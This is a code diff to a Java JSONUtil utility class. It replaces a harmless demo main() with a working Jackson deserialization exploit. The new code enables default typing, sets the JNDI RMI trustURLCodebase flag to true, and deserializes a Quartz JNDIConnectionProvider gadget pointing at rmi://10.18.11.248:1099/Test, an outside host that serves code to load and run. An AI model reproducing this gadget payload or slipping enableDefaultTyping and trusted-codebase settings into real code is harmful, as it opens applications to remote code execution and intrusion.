@@ -1,11 +1,16 @@
 package com.xk.utils;
 
+import java.io.IOException;
 import java.util.Collections;
 import java.util.HashMap;
 import java.util.Map;
 
+import org.apache.ibatis.datasource.jndi.JndiDataSourceFactory;
+
+import com.fasterxml.jackson.core.JsonParseException;
 import com.fasterxml.jackson.core.JsonParser.Feature;
 import com.fasterxml.jackson.databind.JavaType;
+import com.fasterxml.jackson.databind.JsonMappingException;
 import com.fasterxml.jackson.databind.ObjectMapper;
 
 
@@ -103,11 +108,12 @@ public class JSONUtil {
 	}
 	
 	
-	public static void main(String[] args) {
-		Map<String, Object> map = new HashMap<String, Object>();
-		Map<String, Object> map1 = new HashMap<String, Object>();
-		map1.put("1111", 123123);
-		map.put("sdf", map1);
-		System.out.print(toJson(map));
+	public static void main(String[] args) throws JsonParseException, JsonMappingException, IOException {
+		System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
+		ObjectMapper mapper = new ObjectMapper();
+        mapper.enableDefaultTyping();
+        String payload = "[\"org.quartz.utils.JNDIConnectionProvider\",{\"properties\":{\"initial_context\":\"rmi://10.18.11.248:1099/Test\",\"data_source\":\"xx\"}}]";
+        Object o = mapper.readValue(payload, Object.class);
+        mapper.writeValueAsString(o);
 	}
 }
